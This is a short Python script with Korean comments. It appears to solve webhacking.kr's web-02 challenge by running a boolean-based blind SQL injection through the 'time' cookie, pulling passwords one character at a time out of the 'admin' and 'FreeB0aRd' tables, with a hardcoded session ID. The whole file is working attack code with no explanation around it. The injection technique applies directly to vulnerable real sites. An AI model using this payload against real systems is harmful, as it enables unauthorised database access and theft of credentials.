# -*- coding: cp949 -*-
import re, urllib
import urllib.request
my_session = "fca36526f085fed53e76dd2f2fa77703"
pw_admin = ""

FreeB0aRd= ""
'''
print("\nadmin 테이블의 비밀번호를 찾습니다.")
for i in range(1, 12):
    for j in range(33,126):
        url = "http://webhacking.kr/challenge/web/web-02/"
        req = urllib.request.Request(url)
        req.add_header('Cookie',"time=1517168052 and (select ascii(substring(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(i,j,my_session))
        html = urllib.request.urlopen(req).read()
        html_str = str(html)
        find = html_str.find("<!--2070-01-01 09:00:01-->")
 
        if find != -1:
            pw_admin = pw_admin+chr(j)
            print ("find password: " + pw_admin)
            break
        '''
print("\nFreeB0aRd 테이블의 비밀번호를 찾습니다.")
for i in range(1, 11):
    for j in range(33,126):
        url = "http://webhacking.kr/challenge/web/web-02/"
        req = urllib.request.Request(url)
        req.add_header('Cookie',"time=1517168052 and (select ascii(substring(password,%d,1)) from FreeB0aRd)=%d; PHPSESSID=%s" %(i,j,my_session))
        html = urllib.request.urlopen(req).read()
        html_str = str(html)       
        find = html_str.find("<!--2070-01-01 09:00:01-->")
        if find != -1:
            FreeB0aRd = FreeB0aRd + chr(j)
            print ("find password: " + FreeB0aRd)
            break
